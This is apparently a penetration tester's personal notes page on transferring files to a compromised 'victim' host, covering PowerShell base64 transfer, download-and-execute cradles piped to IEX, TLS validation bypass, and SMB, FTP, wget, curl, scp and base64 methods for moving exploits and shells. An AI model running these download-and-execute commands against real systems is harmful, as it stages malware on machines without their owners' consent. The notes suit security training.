---
title: Notes | Transfer Files
author: Zeropio
date: 2022-07-13
categories: [Notes, System]
tags: []
permalink: /notes/system/transfer-files
---

# Windows 

## PowerShell Base64 Encode & Decode 

Let's:
- Check hash
- Encode 
- Transfer

```console
zero@pio$ md5sum exploit
zero@pio$ cat exploit | base64 -w 0; echo

[string]
```

In the victim:
```console
PS C:\victim> [IO.File]::WriteAllBytes("C:\Users\Public\exploit", [Convert]::FromBase64String("[string]"))
```

To check the hash:
```console
PS C:\victim> Get-FileHash C:\Users\Public\exploit -Algorithm md5
```

> Windows CMD has a maximun lenght of 8191 characters
{: .prompt-warning }

## PowerShell Web Downloads 

With the **System.Net.WebClient** class we can download contents from http. This are the methods aviable

| **Method**   | **Description**    |
|--------------- | --------------- |
| `OpenRead` |	Returns the data from a resource as a Stream. |
| `OpenReadAsync` |	Returns the data from a resource without blocking the calling thread. |
| `DownloadData` |	Downloads data from a resource and returns a Byte array. |
| `DownloadDataAsync` |	Downloads data from a resource and returns a Byte array without blocking the calling thread. |
| `DownloadFile` |	Downloads data from a resource to a local file. |
| `DownloadFileAsync` |	Downloads data from a resource to a local file without blocking the calling thread. |
| `DownloadString` |	Downloads a String from a resource and returns a String. |
| `DownloadStringAsync` |	Downloads a String from a resource without blocking the calling thread. |

- File download 

```console
PS C:\victim> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
ps C:\victim> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

- Fileless method 

```console
PS C:\victim> IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
PS C:\victim> (New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
```

- Invoke-WebRequest

```console
PS C:\victim> Invoke-WebRequest  <Target File URL> -OutFile <Output File Name>
```

More examples [here](https://gist.githubusercontent.com/HarmJ0y/bb48307ffa663256e239/raw/f1e0d1877d1b9dd6b3fc8bae18ff6cec6ea6eaa8/DownloadCradles.ps1).

## Troubleshooting

- Internet Explorer first-launch configuration has not been completed 

```console
PS C:\victim> Invoke-WebRequest <Target File URL> | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.

PS C:\victim> Invoke-WebRequest <Target File URL> -UseBasicParsing | IEX
```

- Certificate not trusted

```console
PS C:\victim> IEX(New-Object Net.WebClient).DownloadString('<Target File URL')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."

PS C:\victim> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB downloads 

First create the server:
```console
zero@pio$ sudo impacket-smbserver share -smb2support /tmp/smbshare
```

Then copy it:
```console
PS C:\victim> copy \\<your ip>\share\<exploit>

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

If this happen we need to create it with credentials.
```console
zero@pio$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password pass
```

And then mount it:
```console
PS C:\victim> net use n: \\<your ip>\share /user:test pass
```

## FTP downloads 

With Python3 we can start a FTP server:
```console
zero@pio$ sudo pip3 install pyftpdlib
zero@pio$ sudo python3 -m pyftpdlib --port 2x1table
```

In the victim:
```console
PS C:\victim> (New-Object Net.WebClient).DownloadFile('ftp://<your ip>/<exploit>', '<ouput file>')
```


--- 

# Some tools

## wget

We can start a Python http server on our machine:
```console
zero@pio$ sudo python3 -m http.server 80

  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

And then download our files:
```console
victim@machine$ wget http://<ip>:<port>/exploit.sh 
victim@machine$ curl http://<ip>:<port>/exploit.sh -o exploit.sh 
```

## scp

We can even use **scp**:
```console
zero@pio$ scp exploit.sh victim@machine:/tmp/exploit.sh 
```

## base64

If the machine has a firewall that prevent this the file transfer we can encode it:
```console
zero@pio$ base64 shell -w 0
  f0VM.. <SNIP> ...mDwU
```

And in the victim:
```console
victim@machine$ echo f0VM... <SNIP> ...mDwU | base64 -d > shell
```

---

# Validating

The **file** command can be use to validate:
```console
victim@machine$ file shell
  shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

Also we can check the hash in both machines:
```console
zero@pio$ md5sum shell

victim@machine$ md5sum shell
```




